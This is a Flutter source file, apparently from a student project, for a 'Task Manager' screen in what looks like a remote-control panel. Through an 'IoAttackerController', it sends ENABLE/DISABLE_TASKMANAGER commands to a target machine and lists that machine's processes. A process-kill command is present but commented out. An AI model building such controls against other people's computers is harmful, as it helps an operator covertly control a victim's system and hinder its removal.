import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:inferno_core_fyp/res/constants.dart';
import 'package:inferno_core_fyp/res/helper_extensions.dart';
import 'package:inferno_core_fyp/res/widgets/general%20widgets/my_text.dart';
import 'package:inferno_core_fyp/view%20models/controllers/io_attacker_controller.dart';

import '../../utils/utils.dart';
import '../../view models/controllers/general_controller.dart';

class TaskManagerPage extends StatefulWidget {
  final String targetId;

  const TaskManagerPage({super.key, required this.targetId});

  @override
  State<TaskManagerPage> createState() => _TaskManagerPageState();
}

class _TaskManagerPageState extends State<TaskManagerPage> {
  GeneralController generalController = Get.put(GeneralController());
  IoAttackerController ioAttackerController = Get.put(IoAttackerController());

  @override
  void initState() {
    generalController.getProcesses(widget.targetId);
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Task Manager"),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(15),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Obx(
              () => Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  const MyText(
                    "Enable/Disable Task Manager",
                    fontSize: 17,
                  ),
                  Switch(
                    value: generalController.isTaskManagerEnabled.value,
                    onChanged: (value) {
                      generalController.isTaskManagerEnabled.value = value;
                      final commandText =
                          value ? "ENABLE_TASKMANAGER" : "DISABLE_TASKMANAGER";
                      ioAttackerController.submitCommand(
                        targetId: widget.targetId,
                        data: {"text": commandText, "command_args": {}},
                      );
                    },
                  ),
                ],
              ),
            ),
            const Divider(),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                const MyText('Processes:', fontSize: 23),
                GestureDetector(
                  onTap: () => generalController.getProcesses(widget.targetId),
                  child: const Column(
                    children: [
                      Icon(
                        Icons.refresh,
                        size: 30,
                        color: Colors.yellow,
                      ),
                      MyText(
                        "Refresh ",
                      ),
                    ],
                  ),
                ),
              ],
            ),
            8.ph,
            Expanded(
              child: SingleChildScrollView(
                physics: const BouncingScrollPhysics(),
                child: Obx(
                  () => Table(
                    border: TableBorder.all(color: Colors.white),
                    columnWidths: const {
                      0: FlexColumnWidth(1.1),
                      1: FlexColumnWidth(3.3),
                      2: FlexColumnWidth(1.9),
                      3: FlexColumnWidth(1.6),
                    },
                    children: [
                      _buildTableRow(['P_id', 'Name', 'Ram', 'Kill process'],
                          isHeading: true),
                      for (var process in generalController.processes) ...[
                        _buildTableRow(
                          [
                            process.pid.toString(),
                            process.name,
                            process.memoryUsage,
                            _addBtn(onTap: () {
                              Utils.toastMsg(
                                  "function implemented but commented out");
                            }
                                // onTap: () => ioAttackerController.submitCommand(
                                //   targetId: widget.targetId,
                                //   data: {
                                //     "text": 'KILL_PROCESS',
                                //     "command_args": {"pid": process.pid},
                                //   },
                                // ),
                                ),
                          ],
                        ),
                      ],
                    ],
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

Widget _addBtn({required VoidCallback onTap}) {
  return InkWell(
    onTap: onTap,
    child: const Icon(
      Icons.delete_forever_outlined,
      size: 28,
      color: Colors.red,
    ),
  );
}

TableRow _buildTableRow(List<dynamic> data, {bool isHeading = false}) {
  final List<Widget> cells = data
      .map((cellData) {
        if (cellData is String) {
          return Padding(
            padding: const EdgeInsets.all(6),
            child: Text(
              cellData,
              style: TextStyle(
                color: isHeading ? Colors.yellow : whiteColor,
                fontWeight: isHeading ? FontWeight.bold : null,
              ),
            ),
          );
        } else if (cellData is Widget) {
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 6),
            child: cellData,
          );
        }
        return null;
      })
      .where((element) => element != null)
      .toList()
      .cast<Widget>();

  return TableRow(children: cells);
}
